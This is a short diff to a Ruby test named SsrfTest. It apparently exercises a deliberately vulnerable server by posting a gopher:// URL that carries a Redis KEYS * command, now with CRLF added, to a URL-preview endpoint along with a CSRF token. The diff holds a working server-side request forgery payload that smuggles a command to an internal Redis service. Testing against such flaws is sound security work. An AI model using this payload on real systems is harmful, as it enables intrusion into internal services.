@@ -85,7 +85,7 @@ class SsrfTest < ActiveSupport::TestCase
     res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
     csrf_token = extract_csrf_token(res_show.body)
 
-    keys_url = "gopher://redis:6379/_KEYS%20%2A"
+    keys_url = "gopher://redis:6379/_KEYS%20%2A%0D%0A"
     res_keys = @vuln_server.post(
       "/tasks/#{task_id}/preview_url",
       body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => keys_url),
